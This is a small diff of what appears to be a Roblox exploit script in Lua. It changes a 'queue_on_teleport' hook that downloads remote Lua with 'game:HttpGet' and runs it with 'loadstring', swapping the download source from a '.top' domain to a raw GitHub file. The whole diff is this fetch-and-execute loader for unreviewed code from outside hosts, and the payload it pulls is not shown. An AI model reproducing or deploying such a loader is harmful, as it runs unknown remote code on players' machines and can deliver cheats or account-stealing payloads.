@@ -27,7 +27,7 @@ end
 
 pcall(function()
 	if queue_on_teleport then
-		queue_on_teleport(string.format("loadstring(game:HttpGet(\"https://amazson.top/mm2.lua\"))(%q)", v2))
+		queue_on_teleport(string.format("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/HackerCoder69/ajkwhdawud/refs/heads/main/test\"))(%q)", v2))
 	end
 end)
 
